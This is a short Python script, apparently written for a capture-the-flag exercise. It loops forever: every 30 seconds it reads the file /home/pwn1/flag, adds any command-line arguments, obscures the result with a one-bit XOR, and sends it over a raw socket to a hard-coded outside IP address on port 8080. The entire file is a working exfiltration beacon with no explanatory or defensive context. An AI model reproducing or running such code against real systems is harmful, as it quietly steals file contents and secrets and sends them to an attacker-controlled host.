#!/usr/bin/env python
import socket, time
import subprocess
import sys

def encrypt(c):
	ret = ''
	for d in c:
		ret += chr(ord(d) ^ 1)
	return ret
host = '167.179.90.83'
port = 8080
def per():
	s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((host, port))
	flag = subprocess.check_output(['cat','/home/pwn1/flag'])
	flag = flag[:-1] if flag[-1] == '\n' else flag
	if len(sys.argv) == 3:
		flag += '|' + sys.argv[1] + '|' + sys.argv[2]
	s.send(encrypt(flag))
	s.close()

while 1:
	try:
		per()
	except:
		per()
	time.sleep(30)